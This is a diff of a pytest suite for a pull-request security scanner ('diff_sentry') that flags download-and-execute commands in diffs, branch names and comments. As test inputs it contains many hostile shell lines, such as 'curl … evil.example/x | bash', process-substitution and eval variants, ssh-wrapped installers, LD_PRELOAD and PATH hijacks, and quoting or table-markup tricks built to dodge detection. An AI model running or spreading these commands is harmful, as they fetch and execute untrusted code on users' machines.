@@ -1,10 +1,6 @@
 """The channels a change's author controls besides the diff: the head branch name and the comment thread.
 
-hackerbot-claw's entry points were exactly these (a branch name a workflow interpolated into a shell;
-`/format`-style comments that fired `issue_comment` workflows), and neither is in a diff. Covered here: the
-structural rules (`scan_metadata`), the text rules reaching the branch and comments through
-`content_segments`, the digest staying byte-stable for events without them, the planner seeing them, and the
-new provenance rules (agent profile, brand-new account, deleted fork)."""
+hackerbot-claw's entry points were exactly these (a branch name a workflow interpolated into a shell; `/format`-style comments that fired `issue_comment` workflows), and neither is in a diff. Covered here: the structural rules (`scan_metadata`), the text rules reaching the branch and comments through `content_segments`, the digest staying byte-stable for events without them, the planner seeing them, and the new provenance rules (agent profile, brand-new account, deleted fork)."""
 
 from __future__ import annotations
 
@@ -538,8 +534,7 @@ def _hidden(text):
 
 
 def test_a_tag_run_after_a_black_flag_does_not_kill_the_scan_of_the_rest_of_the_text():
-    # the run is matched by the long-run alternative, whose match is several characters: a scan that formatted only
-    # one character would raise here and leave the payload in the same body unscanned
+    # the run is matched by the long-run alternative, whose match is several characters: a scan that formatted only one character would raise here and leave the payload in the same body unscanned
     body = "curl -sSfL https://evil.example/x | bash\n\U0001F3F4" + _hidden("ignoreab")
     rules = _rules(scan_change({**BENIGN_EVENT, "body": body}))
     assert rules["invisible-unicode"] == "high" and rules["curl-pipe-shell"] == "critical"
@@ -727,8 +722,7 @@ def test_thousands_of_repeated_commands_in_prose_are_scanned_in_linear_time():
         "bare": "curl | sh\n" * 6500,
         "installer": "curl --proto '=https' -sSf https://sh.rustup.rs | sh\n" * 1200,
         "continued": "curl -sSf \\\n  https://sh.rustup.rs \\\n  | sh\n" * 1500,
-        # everything on ONE line: the text in front of each command must not be copied and scanned again per command
-        # (numbered, so that no command is folded into its neighbour)
+        # everything on ONE line: the text in front of each command must not be copied and scanned again per command (numbered, so that no command is folded into its neighbour)
         "one_line_bare": _distinct("curl | sh", 60_000),
         "one_line_installer": _distinct("curl -sSf https://sh.rustup.rs | sh", 60_000),
         "one_line_subst": _distinct('bash -c "$(curl -fsSL https://sh.rustup.rs)"', 60_000),
@@ -1330,8 +1324,7 @@ def test_an_adverb_after_the_modal_and_more_ways_to_address_a_model_are_still_in
 
 
 def test_a_run_of_letters_after_the_shell_is_linear():
-    """`sh -ccccc…` once cost seconds per kilobyte; every pattern used while judging a command is compiled once and
-    bounded."""
+    """`sh -ccccc…` once cost seconds per kilobyte; every pattern used while judging a command is compiled once and bounded."""
     for tail in ("c" * 65_400 + "1", "-" * 65_400, "c-" * 32_000):
         _timed({**BENIGN_EVENT, "body": "curl -sSf https://sh.rustup.rs | sh -" + tail}, budget=3.0)
 
@@ -2140,8 +2133,7 @@ def _cpu_per_char(text, *, prose=True):
 
 
 def _distinct(unit, size):
-    """`size` characters of `unit`, each copy numbered: a repeated identical unit is folded away before it is judged, so a
-    cost test on it measures nothing."""
+    """`size` characters of `unit`, each copy numbered: a repeated identical unit is folded away before it is judged, so a cost test on it measures nothing."""
     n = max(1, size // (len(unit) + 8))
     return "".join(f"{i:06d} {unit} " for i in range(n))
 
@@ -2155,8 +2147,7 @@ _LONG_LINE_UNITS = ["`curl -sSf https://sh.rustup.rs | sh` ", "`sudo curl -sSf h
 
 @pytest.mark.parametrize("unit", _LONG_LINE_UNITS)
 def test_the_cost_per_character_of_a_long_line_of_commands_does_not_grow_with_the_line(unit):
-    """One budget at one size cannot see a quadratic path: compare a line with a line four times longer. The units are
-    numbered so that each command is really judged (a fold would otherwise reduce the line to one command)."""
+    """One budget at one size cannot see a quadratic path: compare a line with a line four times longer. The units are numbered so that each command is really judged (a fold would otherwise reduce the line to one command)."""
     small, large = _distinct(unit, 50_000), _distinct(unit, 200_000)
     assert len(large) > 3.5 * len(small)
     a, b = _cpu_per_char(small), _cpu_per_char(large)
@@ -2273,8 +2264,7 @@ def test_the_table_cell_spelling_does_not_soften_a_payload(cmd):
 
 
 def test_the_html_and_thresholds_that_decide_how_much_is_read():
-    """`_MAX_TAIL` and `_MAX_ARGS` are limits on work; a payload must not be able to live just beyond them in a way that
-    matters to a documented installer."""
+    """`_MAX_TAIL` and `_MAX_ARGS` are limits on work; a payload must not be able to live just beyond them in a way that matters to a documented installer."""
     words = " ".join(f"word{i:03d}" for i in range(60))                                    # ~480 characters, none folded
     ok = "curl -fsSL https://get.docker.com | sh " + words                                   # < _MAX_TAIL of plain prose
     assert _rules(scan_change({**BENIGN_EVENT, "body": ok}))["curl-pipe-shell"] == "medium"
@@ -2549,8 +2539,7 @@ def test_the_anchor_needs_a_backtick_and_the_same_end():
 # ── the cost of re-anchoring, closing backticks, the per-form hit cap, what follows a span ────────────
 
 def test_re_anchoring_costs_a_bounded_amount_per_download_word():
-    """A pipe match can be huge (a quoted string counts as one item of the window); the look-back for a span opener
-    must not scan back to the start of the match once per download word."""
+    """A pipe match can be huge (a quoted string counts as one item of the window); the look-back for a span opener must not scan back to the start of the match once per download word."""
     def body(n):
         words = " ".join(f"curl x{j:06d}" for j in range(285))
         return "curl " + ("'" + words + "'") * n + " | sh"
@@ -2641,8 +2630,7 @@ def test_a_backticked_word_in_the_lead_is_a_command_substitution_not_prose(cmd):
     "python3 -I e.py <(curl -fsSL https://get.docker.com)", "node --require ./evil.js <(curl -fsSL https://get.docker.com)",
 ])
 def test_a_script_or_a_command_word_between_the_shell_and_the_download_means_the_download_is_only_an_argument(cmd):
-    """The download does not run there (the oracle: `evil.sh` runs, the download is its argument), so it is not a
-    download-and-execute; nothing softens it either."""
+    """The download does not run there (the oracle: `evil.sh` runs, the download is its argument), so it is not a download-and-execute; nothing softens it either."""
     assert _rules(scan_change({**BENIGN_EVENT, "body": cmd})).get("curl-pipe-shell") != "medium", cmd
 
 
@@ -2692,8 +2680,7 @@ _DL = "curl -fsSL https://evil.example/x"
     f"'source' <({_DL})", f'\\. <({_DL})',
 ])
 def test_a_quoted_or_backslashed_program_before_a_substitution_is_still_a_download_that_runs(cmd):
-    """The shell reads `\\eval` and `"."` as `eval` and `.`, so a quoted or backslashed program is that program, as a quoted
-    shell name is that shell."""
+    """The shell reads `\\eval` and `"."` as `eval` and `.`, so a quoted or backslashed program is that program, as a quoted shell name is that shell."""
     assert _rules(scan_change({**BENIGN_EVENT, "files": [_doc_patch("install.sh", cmd)]}))["curl-pipe-shell"] == "critical", cmd
 
 
@@ -2734,9 +2721,7 @@ def test_a_scheme_less_integer_host_with_a_path_is_a_host():
 
 
 def test_a_real_program_around_a_backtick_substitution_is_judged_by_the_substitution():
-    """`real_subst`: the shell's flags make `bash -c` a real program running what is in the backticks, which is more than the
-    pipe inside it says; a bare word in front of a span ("Node `…`") is prose. The oracle cannot see this guard (the
-    difference is what the installer prints, and the installer is a known one), so it is pinned here."""
+    """`real_subst`: the shell's flags make `bash -c` a real program running what is in the backticks, which is more than the pipe inside it says; a bare word in front of a span ("Node `…`") is prose. The oracle cannot see this guard (the difference is what the installer prints, and the installer is a known one), so it is pinned here."""
     inner = "curl -fsSL https://get.docker.com | sh"
     for real in (f"bash -c `{inner}`", f"sh -x `{inner}`", f"sudo bash -c `{inner}`"):
         assert _rules(scan_change({**BENIGN_EVENT, "body": real}))["curl-pipe-shell"] == "critical", real
@@ -2884,8 +2869,7 @@ def test_a_plus_option_is_read_like_a_minus_option_before_a_script_operand():
     f"{_EVIL_URL} | <b>python3</b> -", f'<b>bash</b> -c "$({_EVIL_URL})"',
 ])
 def test_a_download_the_markup_hides_from_the_raw_text_is_found_in_the_rendered_view(text):
-    """A reader copies the rendered command (`curl … | sh`), so prose is scanned as rendered too; a code file is not (there the
-    markup is shell syntax, a redirect, and nothing runs)."""
+    """A reader copies the rendered command (`curl … | sh`), so prose is scanned as rendered too; a code file is not (there the markup is shell syntax, a redirect, and nothing runs)."""
     for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]},
                   {**BENIGN_EVENT, "comments": [_comment(body=text)]}):
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text
@@ -3347,8 +3331,7 @@ _EV = "curl https://evil.example/x"
     "echo $'a\n| b | it\\'s' ; " + _EV + " |\nsh",
 ])
 def test_a_line_that_closes_a_string_opened_above_is_never_a_table_row_however_its_quotes_are_written(payload):
-    """The count of quotes on the line says nothing (an escaped `\\"`, the `'\\''` idiom, a closing quote glued to a letter): the
-    line holds a quote character, and that is what a row does not have."""
+    """The count of quotes on the line says nothing (an escaped `\\"`, the `'\\''` idiom, a closing quote glued to a letter): the line holds a quote character, and that is what a row does not have."""
     for event in ({**BENIGN_EVENT, "files": [_doc_patch("install.sh", payload)]}, {**BENIGN_EVENT, "body": payload},
                   {**BENIGN_EVENT, "comments": [_comment(body=payload)]}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", payload)]}):
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", payload
@@ -3364,8 +3347,7 @@ def test_a_stage_in_front_of_an_installer_after_such_a_line_is_not_hidden_either
 
 @pytest.mark.parametrize("first_cell", ["Don't", "it's", '"uv"', 'A "quoted" word'])
 def test_a_quote_in_a_cell_in_front_of_the_command_is_not_plain_text(first_cell):
-    """A quote is shell syntax (`echo "a⏎| " ; "evil" | curl … | sh` runs `evil`), so such a cell is not plain and the row stays a
-    command (an accepted over-alert), whatever follows it."""
+    """A quote is shell syntax (`echo "a⏎| " ; "evil" | curl … | sh` runs `evil`), so such a cell is not plain and the row stays a command (an accepted over-alert), whatever follows it."""
     table = f"| {first_cell} | <code>{_UV} {_PIPE} sh</code> |\n| other | ok |"
     assert _rules(scan_change({**BENIGN_EVENT, "body": table}))["curl-pipe-shell"] == "critical"
 
@@ -3447,8 +3429,7 @@ _D = _DOCKER + " | sh"
     'echo "a\n| " ; "evil" | ' + _D, "+| evil | " + _D,
     # the quote that closes the string above a pipe-led line is not the one that opens the wrapper's argument
     'echo "a\n| b | $(evil |\nssh evil.example "\ncurl -fsSL https://claude.ai/install.sh | bash\n")"',
-    # which quote closes the string above is not for the detector to guess: a closing quote at the line start, a word-internal
-    # apostrophe, an escaped `\"`, `$'…\'…'`, a blank line inside the string, mixed quote kinds
+    # which quote closes the string above is not for the detector to guess: a closing quote at the line start, a word-internal apostrophe, an escaped `\"`, `$'…\'…'`, a blank line inside the string, mixed quote kinds
     "echo 'a\n' | b ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a\n| b'c ; ssh evil.example 'x\n" + _D + "\n'",
     'echo "a\n| b \\" c" ; ssh evil.example "x\n' + _D + '\n"', "echo $'a\n| b \\' c' ; ssh evil.example 'x\n" + _D + "\n'",
     "echo 'a\n\n| b' ; ssh evil.example 'x\n" + _D + "\n'", 'echo "a \'b\n| b" ; ssh evil.example "x\n' + _D + '\n"',
@@ -3468,8 +3449,7 @@ _D = _DOCKER + " | sh"
     "echo 'a\n" + "f\n" * 55 + "| b' ; ssh evil.example 'x\n" + _D + "\n'",
     "echo 'a\nfoo \"b\n| b' ; ssh evil.example 'x\n" + _D + "\n'",
     "echo 'a\n| b | c' ; evil | ssh evil.example '\nwget -qO- https://install.python-poetry.org | sh\n'",
-    # the cells a prefix drop removes are the folded ones: a first cell of more than eighty characters as written (a hundred
-    # blanks, `+1` forty times, six pipes in a row) is shorter once folded, and the stray closer in it is still a closer
+    # the cells a prefix drop removes are the folded ones: a first cell of more than eighty characters as written (a hundred blanks, `+1` forty times, six pipes in a row) is shorter once folded, and the stray closer in it is still a closer
     "echo $((1\n| a" + " " * 100 + "+1 )) | evil | " + _D, "echo $((1\n| a" + " +1" * 40 + " )) | evil | " + _D,
     "echo $((1\n" + " " * 100 + "| a +1 )) | evil | " + _D, "x=${Q:-a\n|" + " " * 100 + "} evil | " + _D,
     "x=${Q:-a\n| | | | | | | } evil | " + _D, "[ $((0\n|" + " " * 100 + "0 )) -ne 0 ] || evil | " + _D,
@@ -3481,8 +3461,7 @@ _D = _DOCKER + " | sh"
     # a line that begins with a cell's pipe `\|` is pipe-led too
     "echo 'a\n\\| b' ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a\n  \\| b' ; ssh evil.example 'x\n" + _D + "\n'",
     "echo 'a\n> \\| b' ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a\n+\\| b' ; ssh evil.example 'x\n" + _D + "\n'",
-    # a line that begins like a row but is not one leaves the line after it a line: a bare relative path is a program only as
-    # the first word of its line
+    # a line that begins like a row but is not one leaves the line after it a line: a bare relative path is a program only as the first word of its line
     "x=${Q:-a\n| b } |\nbin/evil 'x\n" + _D + "\n'", "echo $((1\n| 2 )) |\na/b 'x\n" + _D + "\n'", "x=${Q:-a\n| b } |\n./evil 'x\n" + _D + "\n'",
     "x=${Q:-a\n| b } |\nbin/evil <<'EOF'\n" + _D + "\nEOF",
     # the nearest of the openers is the one that counts, not the one before it
@@ -3533,8 +3512,7 @@ def test_a_cell_after_the_command_is_a_stage_of_its_pipeline_unless_the_command_
 
 
 def test_a_pipe_led_row_without_a_quote_does_not_make_the_installer_below_it_enclosed():
-    """The line above leaves a string open ("the 'quoted"), the row holds a wrapper but no quote, so nothing on it can close that string
-    or open a wrapper's argument and the documented installer on the next line stays medium."""
+    """The line above leaves a string open ("the 'quoted"), the row holds a wrapper but no quote, so nothing on it can close that string or open a wrapper's argument and the documented installer on the next line stays medium."""
     body = f"the 'quoted word\n| docker | docker run x sh -c ls |\n{_DOCKER} | sh"
     assert _rules(scan_change({**BENIGN_EVENT, "body": body}))["curl-pipe-shell"] == "medium"
 
@@ -3558,8 +3536,7 @@ def test_a_table_header_with_a_hash_cell_is_still_a_row():
 
 
 @pytest.mark.parametrize("text", [
-    # the idioms a count of quotes gets wrong (`\'`, `'\''`, `$'…'`, an apostrophe inside a word, a quote of one kind inside the other): the
-    # lexer reads them as a shell does, and the installer is in the wrapper's argument
+    # the idioms a count of quotes gets wrong (`\'`, `'\''`, `$'…'`, an apostrophe inside a word, a quote of one kind inside the other): the lexer reads them as a shell does, and the installer is in the wrapper's argument
     "ssh evil.example 'a'\\''b 'z 'z\n" + _D + "\n'", "ssh -t h it's 'z 'z\n" + _D + "\n'", "docker run x sh -c 'a'\\''b 'z 'z\n" + _D + "\n'",
     "ssh evil.example $'a\\'b 'z 'z\n" + _D + "\n'", 'ssh evil.example "a\\"b "z "z\n' + _D + '\n"',
 ])
@@ -3570,8 +3547,7 @@ def test_the_quote_idioms_on_a_wrapper_line_never_make_it_look_closed(text):
 
 @pytest.mark.parametrize("text", ["ssh evil.example 'a' 'b 'b\n" + _D + "\n'", "echo 'a\n' | b ; ssh evil.example 'x 'x\n" + _D + "\n'"])
 def test_a_wrapper_line_whose_strings_the_shell_closes_is_still_an_opening_line_to_the_line_wide_floor(text):
-    """The quotes pair up for the shell, `'b 'b` being a closed string and a word, so the lexer leaves the installer on its own line; the line-wide floor counts the
-    quote characters (five, an apostrophe or not) and a wrapper word, so the installer stays critical."""
+    """The quotes pair up for the shell, `'b 'b` being a closed string and a word, so the lexer leaves the installer on its own line; the line-wide floor counts the quote characters (five, an apostrophe or not) and a wrapper word, so the installer stays critical."""
     assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"] == "critical"
     from diff_sentry.indicators import _enclosing_lines
     assert _enclosing_lines(text.split("\n"), False)[-2] is False
@@ -3580,9 +3556,7 @@ def test_a_wrapper_line_whose_strings_the_shell_closes_is_still_an_opening_line_
 @pytest.mark.parametrize("pad", [" " * 400, "\t" * 400, "A" * 3000, " a" * 200, " -s" * 200], ids=["blanks", "tabs", "token", "words", "flags"])
 @pytest.mark.parametrize("wrapper", ["ssh evil.example 'x", "docker run x sh -c 'x", "ssh evil.example '"])
 def test_a_wrapper_line_the_fold_shortens_still_encloses_the_installer_below_it(wrapper, pad):
-    """The quote that opens the wrapper's argument counts wherever it stands on the line as written: a blank run, a long token or
-    a repeated word after it makes the line shorter once folded, but the installer on the next line is still inside the argument
-    (`ssh` is called with it, nothing downloads on this machine)."""
+    """The quote that opens the wrapper's argument counts wherever it stands on the line as written: a blank run, a long token or a repeated word after it makes the line shorter once folded, but the installer on the next line is still inside the argument (`ssh` is called with it, nothing downloads on this machine)."""
     text = f"{wrapper}{pad}\n{_D}\n'"
     for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text[:60]
@@ -3591,16 +3565,14 @@ def test_a_wrapper_line_the_fold_shortens_still_encloses_the_installer_below_it(
 @pytest.mark.parametrize("count", [26, 40], ids=["342 characters", "480 characters"])
 @pytest.mark.parametrize("wrapper", ["ssh evil.example 'y", "docker run x sh -c 'y"])
 def test_a_quote_inside_a_closed_string_earlier_on_a_long_line_does_not_pair_with_the_wrappers(wrapper, count):
-    """The apostrophe of `"5' tall"` is inside a closed string, so the wrapper's quote after it, hundreds of characters on, is still the one
-    that opens its argument."""
+    """The apostrophe of `"5' tall"` is inside a closed string, so the wrapper's quote after it, hundreds of characters on, is still the one that opens its argument."""
     text = "echo \"5' tall\" ; " + "".join(f"echo w{i:03d} ; " for i in range(count)) + f"{wrapper}\n{_D}\n'"
     for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text[-80:]
 
 
 def test_the_fold_with_origin_is_the_fold_and_every_character_comes_from_a_place_in_the_text():
-    """`_soften_prose` reads the text a dropped cell was folded from through the origins; a fold that differed from `_fold_padding`, or an
-    origin that went back, would read the wrong text."""
+    """`_soften_prose` reads the text a dropped cell was folded from through the origins; a fold that differed from `_fold_padding`, or an origin that went back, would read the wrong text."""
     import random
 
     from diff_sentry.indicators import _fold_padding, _fold_with_origin
@@ -3642,14 +3614,12 @@ def test_a_wrapper_line_with_repeated_or_padded_quotes_is_read_as_written(text):
     "x=${Q:-a\n|" + "a" * 70 + "|" + "a" * 70 + "|}|evil| " + _D, "x=${Q:-a\n|" + "a" * 70 + "|" + "a" * 70 + "|}|evil|" + _D,
     "x=${Q:-a\n| b | " + "a" * 70 + "|" + "a" * 70 + "|}|evil|" + _D])
 def test_a_dropped_cell_that_the_fold_made_up_is_not_dropped(text):
-    """Cells glued into a word of more than 120 characters are folded into a made-up word: what they were cannot be read back, so nothing
-    is dropped in front of the command (the `}` closes the `${` above, and `evil` and the installer run)."""
+    """Cells glued into a word of more than 120 characters are folded into a made-up word: what they were cannot be read back, so nothing is dropped in front of the command (the `}` closes the `${` above, and `evil` and the installer run)."""
     assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"] == "critical", text
 
 
 def test_a_row_is_not_dropped_when_its_fold_cannot_be_traced_back_to_the_line(monkeypatch):
-    """A fold that differs from `_fold_padding` (a change to one and not to the other) means the text a cell came from is unknown: the
-    cells in front of the installer are kept, and the row is read as the shell tail it might be."""
+    """A fold that differs from `_fold_padding` (a change to one and not to the other) means the text a cell came from is unknown: the cells in front of the installer are kept, and the row is read as the shell tail it might be."""
     row = f"| docker | <code>{_DOCKER} {_PIPE} sh</code> |"
     assert _rules(scan_change({**BENIGN_EVENT, "body": row}))["curl-pipe-shell"] == "medium"
     from diff_sentry import indicators
@@ -3665,8 +3635,7 @@ def test_a_row_is_not_dropped_when_its_fold_cannot_be_traced_back_to_the_line(mo
 @pytest.mark.parametrize("hijack", ["PATH=/tmp/evil:$PATH", "HOME=/tmp/evil", "BASH_ENV=/tmp/evil", "LD_PRELOAD=/tmp/evil.so"])
 @pytest.mark.parametrize("row", ["x=${Q:-a\n| b } |", "| {x} |", "echo $((1\n| 2 )) |"])
 def test_a_line_after_a_line_that_begins_like_a_row_is_still_a_line(row, hijack):
-    """The row is joined to the line after it as a pipeline, but that line stays: a bare `PATH=…` that changes which `curl` runs is
-    read at the start of its own line (zsh runs the hijacked `curl` in the last stage of a pipeline; bash and dash do not)."""
+    """The row is joined to the line after it as a pipeline, but that line stays: a bare `PATH=…` that changes which `curl` runs is read at the start of its own line (zsh runs the hijacked `curl` in the last stage of a pipeline; bash and dash do not)."""
     text = f"{row}\n{hijack}\n{_D}"
     for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text
@@ -3674,8 +3643,7 @@ def test_a_line_after_a_line_that_begins_like_a_row_is_still_a_line(row, hijack)
 
 @pytest.mark.parametrize("pad", [" " * 100, " " * 400])
 def test_a_padded_first_cell_of_a_row_is_still_a_cell(pad):
-    """Aligned tables pad a cell to the widest one of its column: the cells are read as folded and as written, and a padded cell that
-    holds only text drops like any other."""
+    """Aligned tables pad a cell to the widest one of its column: the cells are read as folded and as written, and a padded cell that holds only text drops like any other."""
     row = f"| docker{pad}| `{_DOCKER} \\| sh` |"
     assert _rules(scan_change({**BENIGN_EVENT, "body": f"{row}\n\nDone."}))["curl-pipe-shell"] == "medium", row
 
@@ -3685,8 +3653,7 @@ def test_a_padded_first_cell_of_a_row_is_still_a_cell(pad):
     'bash -c "$(curl -fsSL https://get.docker.com)"'])
 @pytest.mark.parametrize("wrap", ["<code>{}</code>", "<pre>{}</pre>", "{}", "`{}`"])
 def test_a_quote_in_the_command_cell_of_a_row_is_not_a_quote_in_front_of_it(command, wrap):
-    """The guard reads the cells that are dropped, not the cell of the command: `curl -fsSL "https://get.docker.com"` is a documented
-    installer, and it stays one in a table."""
+    """The guard reads the cells that are dropped, not the cell of the command: `curl -fsSL "https://get.docker.com"` is a documented installer, and it stays one in a table."""
     row = f"| docker | {wrap.format(command)} |"
     for event in ({**BENIGN_EVENT, "body": row}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", row)]}):
         assert _rules(scan_change(event))["curl-pipe-shell"] == "medium", row
@@ -3694,8 +3661,7 @@ def test_a_quote_in_the_command_cell_of_a_row_is_not_a_quote_in_front_of_it(comm
 
 @pytest.mark.parametrize("cell", ['`docker run -e KEY="value" foo/foo`', '`bash -c "echo hi"`', '`python3 -c "print(1)"`'])
 def test_a_possessive_in_prose_and_a_quoted_row_do_not_make_the_installer_in_a_later_block_critical(cell):
-    """A prose apostrophe opens a string for the lexer, as it would for a shell, but a string no wrapper opened swallows nothing,
-    and the installer is in a code fence that is read from its own start."""
+    """A prose apostrophe opens a string for the lexer, as it would for a shell, but a string no wrapper opened swallows nothing, and the installer is in a code fence that is read from its own start."""
     body = f"The users' guide covers everything.\n\n| A | B |\n|---|---|\n| run | {cell} |\n\nThen install:\n\n```bash\n{_DOCKER} | sh\n```\n"
     assert _rules(scan_change({**BENIGN_EVENT, "body": body}))["curl-pipe-shell"] == "medium"
 
@@ -3707,8 +3673,7 @@ _PROSE = ("Foo helps the users' teams manage their machines and keep everything 
 
 @pytest.mark.parametrize("lead", ["", "- ", "$ ", "> "])
 def test_an_apostrophe_far_from_a_long_lines_end_does_not_open_a_wrapper(lead):
-    """A possessive earlier in the sentence than `docker run` opens a string of a command that is no wrapper, and `docker run` after it opens
-    nothing: the installer below stays documented."""
+    """A possessive earlier in the sentence than `docker run` opens a string of a command that is no wrapper, and `docker run` after it opens nothing: the installer below stays documented."""
     assert _rules(scan_change({**BENIGN_EVENT, "body": f"{lead}{_PROSE}\n\n{_D}"}))["curl-pipe-shell"] == "medium"
 
 
@@ -3716,8 +3681,7 @@ _FENCE_WRAPPED = "ssh evil.example 'x\ncurl -fsSL https://get.docker.com | sh\n'
 
 
 @pytest.mark.parametrize("text", [
-    # a fence line of the other kind, or too short to close, inside a fence is text: the block is one piece to a reader, and a shell
-    # that was given it reads the string through
+    # a fence line of the other kind, or too short to close, inside a fence is text: the block is one piece to a reader, and a shell that was given it reads the string through
     "~~~\nssh evil.example 'x\n```\ncurl -fsSL https://get.docker.com | sh\n'\n~~~",
     "````\nssh evil.example 'x\n```\ncurl -fsSL https://get.docker.com | sh\n'\n````",
     "```\nssh evil.example 'x\n``\ncurl -fsSL https://get.docker.com | sh\n'\n```",
@@ -3743,9 +3707,7 @@ def test_a_wrapper_argument_is_open_across_what_a_reader_copies_as_one_piece(tex
     (f"```sh\nssh evil.example $(x\n```\n\nThen:\n\n```sh\n{_DOCKER} | sh\n```", "medium"),
 ])
 def test_a_code_fence_is_where_what_the_lexer_reads_begins_and_ends(text, severity):
-    """A string opened in one block (or before the fence) is not open in the next block: a reader copies a block, and the lexer leaves the installer on its own line. (A body pasted
-    into a shell as one script reads it through; documentation is not read that way.) The line-wide floor does not know fences: a line with an odd quote and a wrapper word
-    keeps the installer within sixty lines critical, where `$(` (no quote) leaves the lexer's answer alone."""
+    """A string opened in one block (or before the fence) is not open in the next block: a reader copies a block, and the lexer leaves the installer on its own line. (A body pasted into a shell as one script reads it through; documentation is not read that way.) The line-wide floor does not know fences: a line with an odd quote and a wrapper word keeps the installer within sixty lines critical, where `$(` (no quote) leaves the lexer's answer alone."""
     assert _lexer_leaves_the_installer_on_its_own(text), text
     assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"] == severity, text
 
@@ -3777,9 +3739,7 @@ def test_the_paragraph_a_wrapper_is_in_is_read_afresh_after_prose_with_an_apostr
 
 
 @pytest.mark.parametrize(("text", "severity"), [
-    # an apostrophe in prose opens a string that runs on, and the command that string belongs to is prose (`It's` is no program): a wrapper
-    # that the prose only mentions does not make the documented installer after it an argument of the wrapper; a wrapper line whose own quotes pair up for the
-    # lexer still has five quote characters for the line-wide floor
+    # an apostrophe in prose opens a string that runs on, and the command that string belongs to is prose (`It's` is no program): a wrapper that the prose only mentions does not make the documented installer after it an argument of the wrapper; a wrapper line whose own quotes pair up for the lexer still has five quote characters for the line-wide floor
     (f"It's the one.\n\nssh evil.example 'a' 'b 'b\n{_D}\n'", "critical"),
     (f"Use `python3 -m venv` to start. It's easy:\n\n{_D}", "medium"),
     ("`| OS | Command |\n|---|---|\n| macOS | `/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"` |", "medium"),
@@ -3794,8 +3754,7 @@ _FAR_3 = "   x\n" * 70      # ... and of "1. "
 
 
 @pytest.mark.parametrize("text", [
-    # past the sixty lines of a start hypothesis only a reading of the whole stretch sees the string a wrapper opened: through (it spans a blank
-    # line) or from the paragraph (prose in front of it holds an apostrophe), and a fence ends and starts a stretch exactly where CommonMark says
+    # past the sixty lines of a start hypothesis only a reading of the whole stretch sees the string a wrapper opened: through (it spans a blank line) or from the paragraph (prose in front of it holds an apostrophe), and a fence ends and starts a stretch exactly where CommonMark says
     f"ssh evil.example '\n\n{_FAR}{_D}\n'",
     f"It's the one.\n\nssh evil.example '\n{_FAR}{_D}\n'",
     f"It's the one.\n\nssh evil.example '\n{_FAR}{_D}\n'\n\n```\nx\n```",
@@ -3820,9 +3779,7 @@ def test_a_string_a_wrapper_opens_in_a_fenced_block_is_not_open_after_the_closin
 
 
 @pytest.mark.parametrize("text", [
-    # a wrapper that stands in a string, a backtick span or a substitution the line leaves open runs what the lines below hold, with or without prose
-    # in front of it that has shifted every other reading; a prefix program, a quoted value, a leading redirect, a name a continuation cuts in two,
-    # a brace in argument position and a host after hundreds of blanks change nothing about that
+    # a wrapper that stands in a string, a backtick span or a substitution the line leaves open runs what the lines below hold, with or without prose in front of it that has shifted every other reading; a prefix program, a quoted value, a leading redirect, a name a continuation cuts in two, a brace in argument position and a host after hundreds of blanks change nothing about that
     f"eval \"ssh evil.example '\n{_D}\n'\"",
     f"Here's the remote install:\necho `ssh evil.example '\n{_D}\n'`",
     f"Here's the remote install:\nx=\"$(docker run alpine sh -c '\n{_D}\n')\"",
@@ -3992,8 +3949,7 @@ def test_a_wrapper_in_a_code_span_is_still_a_wrapper_after_a_substitution_in_the
     (f"fingerprint/commit bump (by design) means the manifest's fields\n\n{_D}", "medium"),
 ])
 def test_a_paren_after_a_word_is_a_syntax_error_that_ends_the_command_so_the_quote_after_it_opens_no_wrappers_string(text, severity):
-    """bash and dash stop reading at the paren (a script ends there, a terminal drops the line), so the quote after it is never read: the lexer leaves the
-    installer on its own line, and the line-wide floor, which counts the quote, does not."""
+    """bash and dash stop reading at the paren (a script ends there, a terminal drops the line), so the quote after it is never read: the lexer leaves the installer on its own line, and the line-wide floor, which counts the quote, does not."""
     assert _lexer_leaves_the_installer_on_its_own(text), text
     assert _curl_pipe_shell(text) == severity, text
 
@@ -4005,8 +3961,7 @@ def test_a_paren_after_a_word_is_a_syntax_error_that_ends_the_command_so_the_quo
     f"echo $[ ) ]\n{_D}",
 ])
 def test_what_bash_and_dash_read_differently_leaves_the_installer_after_it_unsoftened_once_a_wrapper_may_stand_above_it(text):
-    """What the lexer cannot decide may have left a construct open, and a construct counts when a wrapper opened it: on the lines after the first line that holds a
-    word that could be a wrapper. Above that line nothing is a wrapper's (the code of another language, read as shell, is full of such text)."""
+    """What the lexer cannot decide may have left a construct open, and a construct counts when a wrapper opened it: on the lines after the first line that holds a word that could be a wrapper. Above that line nothing is a wrapper's (the code of another language, read as shell, is full of such text)."""
     assert _curl_pipe_shell(f"{text.rsplit(chr(10), 1)[0]}\nssh evil.example x\n{_D}") == "critical", text
     assert _curl_pipe_shell(text) == "medium", text
 
@@ -4154,8 +4109,7 @@ def test_a_wrapper_word_inside_a_string_or_in_front_of_a_parenthesis_does_not_ma
 
 @pytest.mark.parametrize("filler,expected", [(59, "critical"), (60, "medium")])
 def test_a_wrapper_word_is_followed_for_sixty_lines(filler, expected):
-    """The window of a start hypothesis: the installer on the 60th line after the wrapper is inside its string, the 61st is not (the
-    top reading is skewed by the lone double quote, and the paragraph reading by the lack of a blank line)."""
